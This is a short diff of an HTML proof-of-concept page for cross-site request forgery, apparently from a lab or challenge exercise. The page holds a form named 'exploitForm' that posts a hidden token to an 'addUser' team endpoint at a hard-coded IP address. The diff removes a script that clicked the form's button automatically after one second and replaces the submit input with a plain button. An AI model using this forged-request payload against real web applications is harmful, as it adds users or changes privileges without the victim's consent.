@@ -3,12 +3,7 @@
 <body>
   <form id="exploitForm" action="http://52.47.161.102:3000/api/teams/1/addUser/hello" method="POST">
     <input type="hidden" name="csrfToken" value="admin_csrf">
-    <input type="submit" id="installButton" value="Install">
+    <button type="button" id="installbutton" value="Install">
   </form>
-  <script>
-    setTimeout(() => {
-      document.getElementById('installButton').click();
-    }, 1000);
-  </script>
 </body>
 </html>
